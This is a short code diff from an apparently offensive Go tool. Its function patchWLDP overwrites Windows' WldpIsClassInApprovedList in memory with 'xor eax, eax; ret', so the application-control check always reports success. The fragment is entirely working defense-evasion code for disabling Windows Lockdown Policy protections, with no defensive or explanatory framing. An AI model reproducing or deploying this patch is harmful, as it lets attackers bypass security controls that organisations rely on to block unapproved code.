@@ -133,8 +133,8 @@ func patchWLDP() error {
 		return nil
 	}
 
-	// mov eax, 1; ret
-	patch := []byte{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}
+	// xor eax, eax; ret — returns S_OK (0)
+	patch := []byte{0x33, 0xC0, 0xC3}
 	return api.PatchMemory(wldpIsClassInApprovedList.Addr(), patch)
 }
 
